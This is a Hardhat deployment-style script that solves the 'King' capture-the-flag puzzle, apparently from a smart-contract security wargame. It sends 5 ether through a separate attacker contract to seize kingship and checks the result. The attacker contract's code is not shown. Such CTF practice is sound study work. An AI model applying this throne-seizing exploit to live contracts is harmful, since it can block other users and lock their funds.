// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import contractAddresses from "../constants/contractAddresses.json";
import assert from "assert";

const PLAYER_ADDRESS = contractAddresses.Player;
const CONTRACT = contractAddresses.King;
const KINGATTACKER = contractAddresses.KingAttacker;

async function main() {
    console.log("Script to solve King puzzle \n ========================================== \n");

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("King", CONTRACT, attacker);
    const contractAttacker = await ethers.getContractAt("KingAttacker", KINGATTACKER, attacker);

    await contractAttacker.sendEth(contract.address, { value: ethers.utils.parseEther("5") });

    assert((await contract._king()) === contractAttacker.address, "King is not the player");
    console.log("King is the player, you can submit the solution");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
